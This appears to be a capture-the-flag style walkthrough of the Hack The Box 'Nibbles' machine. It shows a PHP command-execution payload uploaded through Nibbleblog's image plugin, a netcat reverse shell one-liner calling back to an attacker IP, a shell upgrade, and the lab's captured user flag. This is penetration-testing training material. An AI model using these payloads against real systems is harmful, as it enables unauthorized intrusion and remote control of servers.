* Now that we are logged in to the admin portal, we need to attempt to turn this access into code execution and ultimately gain reverse shell access to the webserver. We know a `Metasploit` module will likely work for this, but let us enumerate the admin portal for other avenues of attack. Looking around a bit, we see the following pages:
	* Publish
	* Comments
	* Manage
	* Settings Themes
	* Plugins
* Attempting to make a new page and embed code or upload files does not seem like the path. Let us check out the plugins page.
	* Let us attempt to use this plugin to upload a snippet of `PHP` code instead of an image. The following snippet can be used to test for code execution.
	```php
<?php system('id'); ?>
```
	* Save this code to a file and then click on the `Browse` button and upload it.
	* We get a bunch of errors, but it seems like the file may have uploaded.
```shell-session
Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26

Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27

Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117

Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118

Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43

Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80
```
* Under `/content`, there is a `plugins` directory and another subdirectory for `my_image`. The full path is at `http://<host>/nibbleblog/content/private/plugins/my_image/`.
	* In this directory, we see two files, `db.xml` and `image.php`, with a recent last modified date, meaning that our upload was successful.
	* To check if we have command execution:
```shell-session
6165@htb[/htb]$ curl http://10.129.42.190/nibbleblog/content/private/plugins/my_image/image.php

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
* We have gained remote code execution on the web server, and the Apache server is running in the `nibbler` user context
* We can now modify our PHP file to obtain a reverse shell and start poking around the server.
	* Let us edit our local PHP file and upload it again. This command should get us a reverse shell. As mentioned earlier in the Module, there are many reverse shell cheat sheets out there. Some great ones are [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md) and [HighOn,Coffee](https://highon.coffee/blog/reverse-shell-cheat-sheet/).
	* Let us use the following `Bash` reverse shell one-liner and add it to our `PHP` script.
```shell-session
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```
* We upload the file again and start a `netcat` listener in our terminal:
```shell-session
0xdf@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
```
* `cURL` the image page again or browse to it in `Firefox` at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.
```shell-session
6165@htb[/htb]$ nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```
* We have a reverse shell, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as `su` will not work, we cannot use text editors, tab-completion does not work, etc.
	* This [post](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/) explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a `Python` one-liner to spawn a pseudo-terminal so commands such as `su` and `sudo` work as discussed previously in this Module.
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
* Our first attempt fails as `Python2` seems to be missing from the system.
```shell-session
$ python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```
* We have `Python3` though, which works to get us to a friendlier shell by typing `python3 -c 'import pty; pty.spawn("/bin/bash")'`. Browsing to `/home/nibbler`, we find the `user.txt` flag as well as a zip file `personal.zip`.
* Retrieve user flag:
```shell-session
nibbler@Nibbles:/home/nibbler$ cat user.txt

cat user.txt

688fef55a59e79dd7bfb5c126386789d
```
